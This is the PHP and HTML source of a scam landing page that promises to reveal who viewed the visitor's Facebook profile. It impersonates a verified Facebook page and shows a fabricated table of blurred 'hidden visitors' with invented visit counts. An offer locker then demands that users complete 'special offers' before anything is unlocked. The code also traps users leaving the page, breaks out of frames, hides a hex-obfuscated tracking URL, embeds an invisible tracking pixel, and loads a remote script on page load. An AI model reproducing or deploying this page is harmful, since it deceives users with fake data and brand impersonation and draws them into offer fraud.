<?php
$mainUrl = "http://oxio.in/faceview/english/";
if(isset($_GET['l']))
{  
	if($_GET['l']=='')
	{
		header("location:".$mainUrl."index.php?retry=1&tkn=0");
	}
}else{
	header("location:".$mainUrl."index.php?retry=1&tkn=0");
}
?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Look at who's looking at your Facebook profile!</title>
    <meta name="description" content="Sieh Dir an, wer Dein Facebook-Profil betrachtet!">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="assets/css/custom.css">

    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link rel="icon" href="favicon.ico" sizes="32x32"><link href="https://i.imgur.com/JROEw7X.png" rel="apple-touch-icon-precomposed" sizes="196x196">

    <style>
        @import url('https://fonts.googleapis.com/css?family=Roboto:400,700,800');
    </style>

    <script src="assets/js/jquery.min.js"></script>
	<script>
		var mainUrl = "http://oxio.in/faceview/english/";
	</script>
</head> 
<body>


<script>

    landerClickthrough = false;

    window.onbeforeunload = function()
    {

        if(!landerClickthrough)
        {
            lllog('USER_EXIT_WHO');
            landerClickthrough = true;
            return '------------------------------------------------------------\n\n\n------------------------------------------------------------';
        }
    }

    if (top.location != self.location) {
        landerClickthrough = true;
        try {
            top.location = self.location;
        } catch(e) {
            window.open(self.location)
        }
    }

</script>





<div class="top_header">
    <div class="top_header_inside">

        <div class="top_header_section"><div style="background-color: #243c6d;"><div class="top_header_icon hdr1"></div></div></div>

        <div class="top_header_section"><div class="top_header_icon hdr2"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr3"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr4"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr5"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr6"></div></div>

    </div><!-- top hdr inside -->
</div><!-- top hdr -->


<div class="fb_main">

    <div class="fb_hdr">

        <div class="fb_logo">
            <div>
                <a href="javascript:void(0);"><i role="img" style="background:#d8dce6 url(https://i.imgur.com/dl27PuQ.jpg) no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:64px;height:64px;"></i></a>
            </div>
        </div>

        <div>
            <div class="fb_verified_outer">
                <span>Facebook</span>
                <span class="fb_verified" role="img" aria-label="Verified Page"></span>
            </div>
            <div class="fb_verified_txt"><a>@facebook</a></div>
        </div>

    </div><!-- fb hdr -->

    <div><div class="fb_announce"><div><span class="fb_announce_inner" style="color: black;">Visitors on the Facebook profile of  <u></u><br />TOP 15</span></div></div></div>


    <br />


    <div id="st_offer" class="fb_msg" style="display: none;"></div>




    <div class="fb_msg" id="st_table">

        <div id="square" class="square"><img /></div>

        <table class="pure-table"><thead>  <th>#</th>  <th>Profile picture </th>  <th>Name</th>   <th><span class='column_desktop'>Visits today</span><span class='column_mobile'>Visits</span></th>   <th class='column_desktop'>Total visits</th>  </thead><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>1</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9609711772278449' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>2</span><span class='column_mobile'>Heute: <b>2</b><br />Gesamt:&nbsp;<b>152</b></span></td>    <td class='column_desktop'>152</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>2</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9795390593735831' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>146</b></span></td>    <td class='column_desktop'>146</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>3</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9137156422975934' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>2</span><span class='column_mobile'>Heute: <b>2</b><br />Gesamt:&nbsp;<b>129</b></span></td>    <td class='column_desktop'>129</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>4</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9860294690539362' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>125</b></span></td>    <td class='column_desktop'>125</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>5</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=8974095872666507' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>4</span><span class='column_mobile'>Heute: <b>4</b><br />Gesamt:&nbsp;<b>77</b></span></td>    <td class='column_desktop'>77</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>6</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9693636123917779' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>69</b></span></td>    <td class='column_desktop'>69</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>7</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9815177621744103' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>2</span><span class='column_mobile'>Heute: <b>2</b><br />Gesamt:&nbsp;<b>55</b></span></td>    <td class='column_desktop'>55</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>8</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=18537827237261077' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>30</b></span></td>    <td class='column_desktop'>30</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>9</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9632301873390963' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>23</b></span></td>    <td class='column_desktop'>23</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>10</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9269963522975171' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>20</b></span></td>    <td class='column_desktop'>20</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>11</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=10189196677633432' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>17</b></span></td>    <td class='column_desktop'>17</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>12</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9601554199810823' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>15</b></span></td>    <td class='column_desktop'>15</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>13</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9694785773812753' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>1</span><span class='column_mobile'>Heute: <b>1</b><br />Gesamt:&nbsp;<b>14</b></span></td>    <td class='column_desktop'>14</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>14</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9412388818729230' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>2</span><span class='column_mobile'>Heute: <b>2</b><br />Gesamt:&nbsp;<b>14</b></span></td>    <td class='column_desktop'>14</td> </tr><tr style="background-color: rgba(255, 0, 0, 0.25);"><td>15</td><td style='text-align: center;'><img src='http://de.faceview.pro/blur.php?x=9783714701571595' /> </td><td> <a href='javascript:void(0);' style='font-weight: italic;' onclick='javascript:lock();'>Hidden - Click to point</a><br />(<i> This user is not <br /> in your friends list! </ i>) </td>   <td><span class='column_desktop'>0</span><span class='column_mobile'>Heute: <b>0</b><br />Gesamt:&nbsp;<b>13</b></span></td>    <td class='column_desktop'>13</td> </tr></table></div>
    <br /><br />

    <script>

        function check_completion(popup) {

            if(!popup && top.location.hash == '#completed') return false;

            stream_ip = '103.41.37.81';
            stream_offer_hash = 'aa3d81c4bb1db2a63d1a37b3f0e6537a';

            $('.fb_txt_main').html('<br /><img src="https://i.imgur.com/1ZUroOV.gif" /><br />Bitte warten...<br /><br />');

            $.post('check.php','ip='+stream_ip+'&hash='+stream_offer_hash, function(data)
            {
                if(data == 'SUCCESS')
                {

                    $('.fb_txt_main').html('<div style="color: #67ad62; font-weight: bold;"><br />Erfolg</div><div style="padding: 20px;">Bitte warten, bis die Seite neu geladen hat...</div>');
                    $('.fb_bottom').remove();
                    landerClickthrough = true;
                    setTimeout(function() { top.location.hash = 'completed'; top.location.reload(); }, 2500);
                    lllog('__UNLOCK_SUCCESS__', 4);

                } else {

                    if(popup) {

                        $('.fb_txt_main').html('<div style="color: red;"><br />Error</div><br /><img src="https://i.imgur.com/1ZUroOV.gif" /><div style="padding: 20px;">You must complete at least one of our special offers. Please try again.</div>');
                        $('.fb_txt_main').css('background-color', 'rgba(251, 255, 0, 0.32)');
                        // $('.fb_bottom').html("<button onclick='lock();' class='fb_button'>Continue</button>");

                        lllog('clicked_check_completion');

                    }

                }

            });

        }


        function lock()
        {
            $('#st_table').hide();
            $("#st_offer").html("<div class='fb_txt_main' style='text-align: center;'><br /><img src='https://i.imgur.com/1ZUroOV.gif' /><br /><div>Please wait...</div><br /><br /></div>");
            $('#st_offer').fadeIn(); // loading screen
            $('#st_offer_list').hide();

            try { clearInterval(checkcomp); } catch(err) {}

            setTimeout(function() {

                $.getJSON(mainUrl+'ofrs.php?c=faceview_de&p=who_locker&h='+Math.random(), function(data) {

				
					
                    $("#st_offer").fadeOut();

                    setTimeout(function() {

                        $("#st_offer").html('<div class="fb_offer_title"><b>In order to unlock the hidden content, you must take at least one of our special offers</b><br />It only takes 1 minute!</div><div id="st_offer_list"></div>');
                        $("#st_offer").fadeIn();
                        $('#st_offer_list').hide();

                        setTimeout(function() {
                            // loop over offers

                            if(data.length == 0) {

                                $('#st_offer_list').append('<div data-url="" data-inst="" class="st_offer_box"><span class="st_offer_color">We don\'t have special offers available for your country</span><br /><span class="st_offer_subtitle">Sorry for the inconvenience.</span></div>');

                            } else {

                                $.each(data, function(idx, val) {

                                    $('#st_offer_list').append('<div data-name="'+val.name+'" data-url="'+val.url+'" data-inst="'+val.inst+'" class="st_offer_box"><span class="st_offer_color">'+val.name+'</span><br /><span class="st_offer_subtitle">'+val.subtitle+'</span><div class="st_offer_arrow"></div></div>');
                                });

                            }

                            $('#st_offer_list').slideDown();
                            lllog('clicked_show_hidden', 2);


                        }, 400);


                    }, 400);

                }); // ajax

            }, 400);

        }

        $('#st_offer').on('click', '.st_offer_box', function(){

            $(this).prop('disabled', true);

            var url = $(this).data('url');
            var inst = $(this).data('inst');
            var name = $(this).data('name');

            if(!url) {
                $(this).prop('disabled', false);
                return false;
            }

            // popup instr
            if(inst.length > 10) { // TODO


            }

            // window open
            win91 = window.open(url);

            $('#st_offer_list').slideUp();
            setTimeout(function() {
                $('#st_offer_list').html("<div class='fb_txt_main' style='text-align: center;'><br /><img src='https://i.imgur.com/1ZUroOV.gif' /><br /><div id='st_loading_txt'></div><br /><br /></div><div class='fb_bottom'><button onclick='check_completion(true);' class='fb_button' style='float:left; background-color:#67ad62;'>Get access</button><button onclick='lock();' class='fb_button' style='float:right;'>try again</button></div>").slideDown();

                $(this).prop('disabled', false);

                checkcomp = setInterval(function() { check_completion(); }, 10000);

            }, 400);

            lllog('clicked_locker', 3);
            lllog('clicked_locker_'+name.replace(' ', '_'));

        });


        function lllog(evt, step) {

            var href = top.location.href + top.location.hash;
            var ts = ((new Date()).getTime() / 1000);
            var stp = (typeof step === 'undefined' || !step) ? '' : step;
            var url = '\x2F\x2F\x73\x73\x6C\x32\x2E\x61\x70\x70\x73\x70\x6F\x74\x2E\x73\x69\x74\x65\x2F\x6C\x2E\x6C\x6F\x67\x3F\x70\x72\x6D\x3D\x6C\x26\x72\x66\x3D\x68\x74\x74\x70\x25\x33\x41\x25\x32\x46\x25\x32\x46\x64\x65\x2E\x73\x65\x63\x72\x65\x74\x76\x69\x65\x77\x2E\x77\x69\x6E\x25\x32\x46\x25\x33\x46\x73\x75\x63\x63\x65\x73\x73\x25\x33\x44\x31\x26\x63\x3D\x66\x61\x63\x65\x76\x69\x65\x77\x5F\x64\x65\x26\x6F\x3D\x66\x62\x5F\x77\x68\x6F\x26\x65\x76\x3D'+encodeURIComponent(evt)+'&ts='+ts+'&st='+stp+'&href='+encodeURIComponent(href);

            /*$.ajax({
                type: 'POST',
                url: url,
                data: '',
                success: function(resp){},
                async: true
            });*/

        }


        $(document).ready(function() {
            lllog('landed_on_who', 1);
        });


    </script>

    <br /><br /><br /><br /><br /><br />

    <div style="display: none;"><img src="//ssl2.appspot.site/am.jpg?o=faceview_de&p=fb_who&rf=http%3A%2F%2Fde.secretview.win%2F%3Fsuccess%3D1&prm=l&href=http%3A%2F%2Fde.faceview.pro%2Fwho.php%3Fl%3DRco3WsHKS2ryrF06wtj%252FMN%252FyNfl4W4iZQAs77%252FP1hec%253D%26z%3DMTAzLjQxLjM3Ljgx&t=1513763478" width="0" height="0" border="0" /></div>


    <script src="//geoip.club/rnfb.php?p=fbwho&c=faceview_de"></script>
</body>
</html>